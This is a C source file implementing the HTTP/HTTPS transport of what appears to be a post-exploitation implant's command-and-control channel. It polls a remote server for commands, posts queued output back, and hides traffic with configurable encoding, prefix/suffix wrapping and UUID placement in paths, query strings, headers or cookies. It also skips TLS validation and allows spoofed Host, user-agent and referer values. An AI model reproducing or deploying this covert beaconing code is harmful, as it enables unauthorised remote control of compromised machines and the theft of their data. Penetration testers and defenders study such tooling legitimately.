
/**
 * @brief c2_http.c HTTP transport
 * @file c2_http.c
 */

#include <stdbool.h>
#include <stdlib.h>
#include <string.h>

#include "argv_split.h"
#include "base64.h"
#include "c2.h"
#include "http_client.h"
#include "log.h"
#include "tlv.h"
#include "command_ids.h"

struct http_ctx {
	struct c2_transport *t;
	char *uri;
	struct ev_timer poll_timer;
	char ** headers;
	struct http_request_data data;
	struct http_request_opts opts;
	struct buffer_queue *egress;
	int first_packet;
	int running;
	bool online;
};

static int add_header(struct http_ctx *ctx, const char *header);
static void http_ctx_free(struct http_ctx *ctx);

/*
 * Base64URL encode: uses -_ instead of +/, no padding
 */
static char *b64url_encode(const void *src, size_t src_len, size_t *out_len)
{
	size_t b64_len = ((src_len + 2) / 3) * 4 + 1;
	char *b64 = malloc(b64_len);
	if (!b64) return NULL;

	int len = base64encode(b64, src, src_len);
	/* Convert to URL-safe and strip padding */
	for (int i = 0; i < len; i++) {
		if (b64[i] == '+') b64[i] = '-';
		else if (b64[i] == '/') b64[i] = '_';
	}
	while (len > 0 && b64[len - 1] == '=') len--;
	b64[len] = '\0';
	if (out_len) *out_len = len;
	return b64;
}

static void *c2_encode(const void *data, size_t len, int enc, size_t *out_len)
{
	if (enc == C2_ENCODING_B64) {
		size_t b64_len = ((len + 2) / 3) * 4 + 1;
		char *out = malloc(b64_len);
		if (!out) return NULL;
		int olen = base64encode(out, data, len);
		out[olen] = '\0';
		*out_len = olen;
		return out;
	} else if (enc == C2_ENCODING_B64URL) {
		return b64url_encode(data, len, out_len);
	}
	void *out = malloc(len);
	if (out) {
		memcpy(out, data, len);
		*out_len = len;
	}
	return out;
}

static void *c2_decode(const void *data, size_t len, int enc, size_t *out_len)
{
	if (enc == C2_ENCODING_B64 || enc == C2_ENCODING_B64URL) {
		/* base64decode handles both standard and URL-safe variants */
		size_t max_len = ((len + 3) / 4) * 3 + 1;
		char *out = malloc(max_len);
		if (!out) return NULL;
		/* Need null-terminated string for base64decode */
		char *tmp = malloc(len + 1);
		if (!tmp) { free(out); return NULL; }
		memcpy(tmp, data, len);
		/* Convert URL-safe back to standard for decoder */
		for (size_t i = 0; i < len; i++) {
			if (tmp[i] == '-') tmp[i] = '+';
			else if (tmp[i] == '_') tmp[i] = '/';
		}
		tmp[len] = '\0';
		int olen = base64decode(out, tmp, len);
		free(tmp);
		if (olen < 0) { free(out); return NULL; }
		*out_len = olen;
		return out;
	}
	void *out = malloc(len);
	if (out) {
		memcpy(out, data, len);
		*out_len = len;
	}
	return out;
}

static char *get_uuid_from_uri(const char *uri)
{
	/* Extract UUID from the URI path (last path segment) */
	const char *path = strstr(uri, "://");
	if (path) path = strchr(path + 3, '/');
	if (!path || strlen(path) <= 1) return NULL;

	path++; /* skip leading / */
	const char *end = path + strlen(path);
	if (*(end - 1) == '/') end--;
	const char *last_slash = path;
	for (const char *p = path; p < end; p++) {
		if (*p == '/') last_slash = p + 1;
	}
	if (last_slash >= end) return NULL;

	size_t len = end - last_slash;
	char *uuid = malloc(len + 1);
	if (uuid) {
		memcpy(uuid, last_slash, len);
		uuid[len] = '\0';
	}
	return uuid;
}

/*
 * Resolve the per-transport UUID used for C2 profile placement. Prefers the
 * value supplied via TLV_TYPE_C2_UUID; falls back to the URL path's last
 * segment when unset. Returned string is malloc'd; caller frees.
 */
static char *get_transport_uuid(struct http_ctx *ctx)
{
	struct c2_transport_config *tc = c2_transport_get_config(ctx->t);
	if (tc && tc->c2_uuid && *tc->c2_uuid) {
		return strdup(tc->c2_uuid);
	}
	return get_uuid_from_uri(ctx->uri);
}

/*
 * Apply the profile's UUID transform (encode + prepend + append) to the
 * raw UUID before placement. Returns a malloc'd null-terminated string
 * the caller must free, or NULL on failure / empty input.
 * If vc is NULL, returns a plain strdup(uuid).
 */
static char *render_uuid(struct c2_verb_config *vc, const char *uuid)
{
	if (!uuid || !*uuid) return NULL;
	if (!vc) return strdup(uuid);

	size_t uuid_len = strlen(uuid);
	size_t encoded_len = 0;
	void *encoded = c2_encode(uuid, uuid_len, vc->enc_uuid, &encoded_len);
	if (!encoded) return NULL;

	size_t total = vc->uuid_prefix_len + encoded_len + vc->uuid_suffix_len;
	char *out = malloc(total + 1);
	if (!out) { free(encoded); return NULL; }

	char *p = out;
	if (vc->uuid_prefix_len > 0) {
		memcpy(p, vc->uuid_prefix, vc->uuid_prefix_len);
		p += vc->uuid_prefix_len;
	}
	memcpy(p, encoded, encoded_len);
	p += encoded_len;
	if (vc->uuid_suffix_len > 0) {
		memcpy(p, vc->uuid_suffix, vc->uuid_suffix_len);
		p += vc->uuid_suffix_len;
	}
	*p = '\0';
	free(encoded);
	return out;
}

static char *build_profile_url(const char *base_uri, struct c2_verb_config *vc, const char *uuid)
{
	if (!vc || !vc->uri) {
		return strdup(base_uri);
	}

	/* Extract scheme://host:port from base URI */
	const char *proto_end = strstr(base_uri, "://");
	if (!proto_end) return strdup(base_uri);
	const char *host_start = proto_end + 3;
	const char *path_start = strchr(host_start, '/');
	size_t base_len = path_start ? (size_t)(path_start - base_uri) : strlen(base_uri);

	const char *profile_uri = vc->uri;
	int needs_slash = (profile_uri[0] != '/');

	char *rendered = render_uuid(vc, uuid);

	/*
	 * When the profile does not specify a placement for the UUID
	 * (no uuid_get/uuid_header/uuid_cookie), the handler still needs to
	 * locate the session via the request path — append the UUID to the
	 * URI path. Matches PHP/Python behaviour.
	 */
	bool uuid_in_path = rendered && !vc->uuid_get && !vc->uuid_header && !vc->uuid_cookie;

	size_t url_len = base_len + 1 + strlen(profile_uri) + 1;
	if (rendered && vc->uuid_get) {
		url_len += 1 + strlen(vc->uuid_get) + 1 + strlen(rendered);
	}
	if (uuid_in_path) {
		url_len += 1 + strlen(rendered);
	}

	char *url = malloc(url_len + 1);
	if (!url) { free(rendered); return NULL; }

	int written = snprintf(url, url_len + 1, "%.*s%s%s",
		(int)base_len, base_uri,
		needs_slash ? "/" : "",
		profile_uri);

	if (uuid_in_path) {
		bool need_sep = written > 0 && url[written - 1] != '/';
		written += snprintf(url + written, url_len + 1 - written, "%s%s",
			need_sep ? "/" : "", rendered);
	}

	if (rendered && vc->uuid_get) {
		char sep = strchr(url, '?') ? '&' : '?';
		snprintf(url + written, url_len + 1 - written, "%c%s=%s", sep, vc->uuid_get, rendered);
	}

	free(rendered);
	return url;
}

static void *decode_response_with_profile(struct buffer_queue *response_q,
	struct c2_verb_config *vc, size_t *out_len);

static void patch_uuid(struct http_ctx *ctx, struct buffer_queue *q)
{
	struct c2_transport_config *tc = c2_transport_get_config(ctx->t);
	struct c2_verb_config *get_profile = tc ? tc->c2_get : NULL;

	/*
	 * The framework wraps the patch-uuid response via the GET profile's
	 * outbound transform (prefix/suffix + encoding). Decode through the
	 * same profile before parsing the TLV.
	 */
	size_t decoded_len = 0;
	void *decoded = decode_response_with_profile(q, get_profile, &decoded_len);
	if (!decoded) {
		return;
	}

	struct buffer_queue *decoded_q = buffer_queue_new();
	if (!decoded_q) {
		free(decoded);
		return;
	}
	buffer_queue_add(decoded_q, decoded, decoded_len);
	free(decoded);

	struct tlv_packet *request = tlv_packet_read_buffer_queue(NULL, decoded_q);
	buffer_queue_free(decoded_q);
	if (request) {
		uint32_t command_id = 0;
		tlv_packet_get_u32(request, TLV_TYPE_COMMAND_ID, &command_id);

		if (command_id == COMMAND_ID_CORE_PATCH_UUID) {
			const char *new_uuid = tlv_packet_get_str(request, TLV_TYPE_C2_UUID);
			if (new_uuid && tc) {
				free(tc->c2_uuid);
				tc->c2_uuid = strdup(new_uuid);
			}
		}
		tlv_packet_free(request);
	}
}

/*
 * Drain a response queue and apply the inbound C2 profile transform
 * (prefix/suffix skip + encoding). Returns a malloc'd buffer the caller
 * must free, or NULL on empty/error. *out_len is set on success.
 */
static void *decode_response_with_profile(struct buffer_queue *response_q,
	struct c2_verb_config *vc, size_t *out_len)
{
	void *raw = NULL;
	ssize_t raw_len = buffer_queue_remove_all(response_q, &raw);
	if (!raw || raw_len <= 0) {
		free(raw);
		return NULL;
	}

	if (!vc) {
		*out_len = (size_t)raw_len;
		return raw;
	}

	int start = vc->prefix_skip;
	int end = raw_len - vc->suffix_skip;
	if (start >= end || start < 0 || end > (int)raw_len) {
		start = 0;
		end = raw_len;
	}
	size_t stripped_len = end - start;

	size_t decoded_len = 0;
	void *decoded = c2_decode((char *)raw + start, stripped_len, vc->enc_inbound, &decoded_len);
	free(raw);
	if (!decoded || decoded_len == 0) {
		free(decoded);
		return NULL;
	}
	*out_len = decoded_len;
	return decoded;
}

/*
 * Process a response with C2 profile decoding (prefix/suffix stripping + encoding)
 */
static void process_response_with_profile(struct http_ctx *ctx,
	struct buffer_queue *response_q, struct c2_verb_config *vc)
{
	if (!vc) {
		/* No profile — pass raw data through */
		c2_transport_ingress_queue(ctx->t, response_q);
		return;
	}

	size_t decoded_len = 0;
	void *decoded = decode_response_with_profile(response_q, vc, &decoded_len);
	if (decoded) {
		c2_transport_ingress_buf(ctx->t, decoded, decoded_len);
		free(decoded);
	}
}

/*
 * Prepare egress data with C2 profile encoding (encoding + prefix/suffix wrapping)
 */
static void *encode_egress_with_profile(void *data, size_t data_len,
	struct c2_verb_config *vc, size_t *out_len)
{
	if (!vc) {
		*out_len = data_len;
		return data;
	}

	size_t encoded_len = 0;
	void *encoded = c2_encode(data, data_len, vc->enc_outbound, &encoded_len);
	free(data);
	if (!encoded) return NULL;

	size_t prefix_len = vc->prefix ? vc->prefix_len : 0;
	size_t suffix_len = vc->suffix ? vc->suffix_len : 0;

	if (prefix_len == 0 && suffix_len == 0) {
		*out_len = encoded_len;
		return encoded;
	}

	size_t total = prefix_len + encoded_len + suffix_len;
	void *wrapped = malloc(total);
	if (!wrapped) { free(encoded); return NULL; }

	char *p = wrapped;
	if (prefix_len > 0) {
		memcpy(p, vc->prefix, prefix_len);
		p += prefix_len;
	}
	memcpy(p, encoded, encoded_len);
	p += encoded_len;
	if (suffix_len > 0) {
		memcpy(p, vc->suffix, suffix_len);
	}
	free(encoded);

	*out_len = total;
	return wrapped;
}

static void http_poll_cb(struct http_conn *conn, void *arg)
{
	struct http_ctx *ctx = arg;

	int code = http_conn_response_code(conn);

	if (code > 0) {
		if(!ctx->online) {
			ctx->first_packet = 1;
			ctx->poll_timer.repeat = 0.1;
			ctx->online = true;
		}
		c2_transport_reachable(ctx->t);
	} else {
		c2_transport_unreachable(ctx->t);
		ctx->online = false;
	}

	bool got_command = false;
	if (code == 200) {
		struct buffer_queue *q = http_conn_response_queue(conn);
		if (ctx->first_packet) {
			patch_uuid(ctx, q);
			ctx->first_packet = 0;
			got_command = true;
		} else {
			if (buffer_queue_len(ctx->egress) > 0) {
				got_command = true;
			}
			if (buffer_queue_len(q) > 0) {
				got_command = true;
				struct c2_transport_config *tc = c2_transport_get_config(ctx->t);
				struct c2_verb_config *get_profile = tc ? tc->c2_get : NULL;
				process_response_with_profile(ctx, q, get_profile);
			}
		}
	}
	if(ctx->online) {
		if (got_command) {
			ctx->poll_timer.repeat = 0.1;
		} else {
			if (ctx->poll_timer.repeat < 10.0) {
				ctx->poll_timer.repeat += 0.01;
			}
		}
	}else {
		ctx->poll_timer.repeat = 10;
	}
	if (ctx->running) {
		ev_timer_again(c2_transport_loop(ctx->t), &ctx->poll_timer);
		if(!ctx->online) {
			ctx->poll_timer.repeat = 0;
		}
	}
}

static void add_profile_headers(struct http_ctx *ctx, struct c2_verb_config *vc)
{
	if (!vc) return;

	char *uuid = get_transport_uuid(ctx);
	if (!uuid) return;

	char *rendered = render_uuid(vc, uuid);
	free(uuid);
	if (!rendered) return;

	if (vc->uuid_header) {
		char *hdr = NULL;
		if (asprintf(&hdr, "%s: %s", vc->uuid_header, rendered) != -1) {
			add_header(ctx, hdr);
			free(hdr);
		}
	}
	if (vc->uuid_cookie) {
		char *cookie = NULL;
		if (asprintf(&cookie, "%s=%s", vc->uuid_cookie, rendered) != -1) {
			free(ctx->data.cookie_list);
			ctx->data.cookie_list = cookie;
		}
	}
	free(rendered);
}

static void http_poll_timer_cb(struct ev_loop *loop, struct ev_timer *w, int revents)
{
	struct http_ctx *ctx = w->data;
	bool sent = false;

	struct c2_transport_config *tc = c2_transport_get_config(ctx->t);
	struct c2_verb_config *post_profile = tc ? tc->c2_post : NULL;
	struct c2_verb_config *get_profile = tc ? tc->c2_get : NULL;

	while (buffer_queue_len(ctx->egress) > 0) {
		ctx->data.content = buffer_queue_remove_msg(ctx->egress, &ctx->data.content_len);

		if (post_profile) {
			size_t encoded_len = 0;
			void *encoded = encode_egress_with_profile(
				ctx->data.content, ctx->data.content_len,
				post_profile, &encoded_len);
			ctx->data.content = encoded;
			ctx->data.content_len = encoded_len;
		}

		char *uuid = get_transport_uuid(ctx);
		char *post_url = build_profile_url(ctx->uri, post_profile, uuid);
		free(uuid);
		add_profile_headers(ctx, post_profile);

		http_request(post_url ? post_url : ctx->uri, http_request_post,
				http_poll_cb, ctx, &ctx->data, &ctx->opts);
		free(post_url);
		ctx->data.content_len = 0;
		ctx->data.content = NULL;
		sent = true;
	}

	if (!sent) {
		char *uuid = get_transport_uuid(ctx);
		char *get_url = build_profile_url(ctx->uri, get_profile, uuid);
		free(uuid);
		add_profile_headers(ctx, get_profile);

		http_request(get_url ? get_url : ctx->uri, http_request_get,
				http_poll_cb, ctx, &ctx->data, &ctx->opts);
		free(get_url);
	}
}

static void http_ctx_free(struct http_ctx *ctx)
{
	if (ctx) {
		if (ctx->egress) {
			buffer_queue_free(ctx->egress);
		}
		free(ctx->uri);
		for (int i = 0; i < ctx->data.num_headers; i++) {
			free(ctx->headers[i]);
		}
		free(ctx->headers);
		free(ctx->data.ua);
		free(ctx->data.referer);
		free(ctx->data.cookie_list);
		free((void *)ctx->opts.proxy.hostname);
		free((void *)ctx->opts.proxy.auth_user);
		free((void *)ctx->opts.proxy.auth_pass);
		free(ctx);
	}
}

static int add_header(struct http_ctx *ctx, const char *header)
{
	ctx->headers = reallocarray(ctx->headers, ctx->data.num_headers + 1,
			sizeof(char *));
	if (ctx->headers) {
		if ((ctx->headers[ctx->data.num_headers] = strdup(header))) {
			ctx->data.num_headers++;
			return 0;
		}
	}
	return -1;
}

/*
 * Parse a proxy URL of the form "scheme://host:port" or "socks=host:port"
 * (the latter being the framework's SOCKS encoding) and populate the
 * transport's http_request_opts.proxy fields. Adds basic auth credentials
 * when configured.
 */
static void apply_proxy_config(struct http_ctx *ctx, struct c2_transport_config *tc)
{
	const char *url = tc->proxy_url;
	enum http_proxy_type type = http_proxy_http;
	const char *host_start;

	if (strncmp(url, "socks=", 6) == 0) {
		type = http_proxy_socks5;
		host_start = url + 6;
	} else if (strncmp(url, "socks://", 8) == 0) {
		type = http_proxy_socks5;
		host_start = url + 8;
	} else if (strncmp(url, "http://", 7) == 0) {
		host_start = url + 7;
	} else if (strncmp(url, "https://", 8) == 0) {
		host_start = url + 8;
	} else {
		host_start = url;
	}

	const char *colon = strrchr(host_start, ':');
	if (!colon) {
		return;
	}
	size_t host_len = colon - host_start;
	char *host = malloc(host_len + 1);
	if (!host) {
		return;
	}
	memcpy(host, host_start, host_len);
	host[host_len] = '\0';

	ctx->opts.proxy.type = type;
	ctx->opts.proxy.hostname = host;
	ctx->opts.proxy.port = (uint16_t)atoi(colon + 1);

	if (tc->proxy_user && *tc->proxy_user) {
		ctx->opts.proxy.auth_type = http_auth_basic;
		ctx->opts.proxy.auth_user = strdup(tc->proxy_user);
		if (tc->proxy_pass) {
			ctx->opts.proxy.auth_pass = strdup(tc->proxy_pass);
		}
	}
}

int http_transport_init(struct c2_transport *t)
{
	struct http_ctx *ctx = calloc(1, sizeof *ctx);
	if (ctx == NULL) {
		return -1;
	}

	ctx->t = t;
	ctx->uri = strdup(c2_transport_uri(t));
	if (ctx->uri == NULL) {
		goto err;
	}

	ctx->data.content_type = "application/octet-stream";
	ctx->opts.flags = HTTP_OPTS_SKIP_TLS_VALIDATION;

	add_header(ctx, "Connection: close");

	/* Apply config from TLV config block if available */
	struct c2_transport_config *tc = c2_transport_get_config(t);
	if (tc) {
		if (tc->user_agent) {
			ctx->data.ua = strdup(tc->user_agent);
		}
		if (tc->custom_headers) {
			/* Headers are CRLF-separated */
			char *hdrs = strdup(tc->custom_headers);
			char *line = strtok(hdrs, "\r\n");
			while (line) {
				if (strlen(line) > 0) {
					add_header(ctx, line);
				}
				line = strtok(NULL, "\r\n");
			}
			free(hdrs);
		}
		if (tc->proxy_url && *tc->proxy_url) {
			apply_proxy_config(ctx, tc);
		}
	}

	/* Legacy: parse args after | in URI */
	char *args = strchr(ctx->uri, '|');
	if (args) {
		*args = '\0';
		if (strlen(++args)) {
			size_t argc = 0;
			char **argv = argv_split(args, NULL, &argc);
			for (size_t i = 0; i + 1 < argc && argv[i + 1]; i += 2) {
				if (strcmp(argv[i], "--host") == 0) {
					char *host_header = NULL;
					if (asprintf(&host_header, "Host: %s", argv[i + 1]) != -1) {
						add_header(ctx, host_header);
						free(host_header);
					}
				}
				if (strcmp(argv[i], "--ua") == 0) {
					free(ctx->data.ua);
					ctx->data.ua = strdup(argv[i + 1]);
				}
				if (strcmp(argv[i], "--referer") == 0) {
					ctx->data.referer = strdup(argv[i + 1]);
				}
				if (strcmp(argv[i], "--cookie") == 0) {
					ctx->data.cookie_list = strdup(argv[i + 1]);
				}
				if (strcmp(argv[i], "--header") == 0) {
					add_header(ctx, argv[i + 1]);
				}
			}
		}
	}

	ctx->data.headers = ctx->headers;
	ctx->first_packet = 1;
	ctx->online = false;
	ev_init(&ctx->poll_timer, http_poll_timer_cb);
	ctx->poll_timer.data = ctx;

	ctx->egress = buffer_queue_new();
	if (ctx->egress == NULL) {
		goto err;
	}

	c2_transport_set_ctx(t, ctx);
	return 0;

err:
	http_ctx_free(ctx);
	return -1;
}

void http_transport_start(struct c2_transport *t)
{
	struct http_ctx *ctx = c2_transport_get_ctx(t);
	ctx->running = 1;
	ctx->poll_timer.repeat = 0.1;
	ev_timer_again(c2_transport_loop(t), &ctx->poll_timer);
	ctx->poll_timer.repeat = 0;
}

void http_transport_egress(struct c2_transport *t, struct buffer_queue *egress)
{
	struct http_ctx *ctx = c2_transport_get_ctx(t);
	buffer_queue_move_all(ctx->egress, egress);
}

void http_transport_stop(struct c2_transport *t)
{
	struct http_ctx *ctx = c2_transport_get_ctx(t);
	if (ctx->running) {
		ctx->running = 0;
	}
}

void http_transport_free(struct c2_transport *t)
{
	struct http_ctx *ctx = c2_transport_get_ctx(t);
	buffer_queue_free(ctx->egress);
}

void c2_register_http_transports(struct c2 *c2)
{
	struct c2_transport_cbs http_cbs = {
		.init = http_transport_init,
		.start = http_transport_start,
		.egress = http_transport_egress,
		.stop = http_transport_stop,
		.free = http_transport_free
	};

	c2_register_transport_type(c2, "http", &http_cbs);
	c2_register_transport_type(c2, "https", &http_cbs);
}
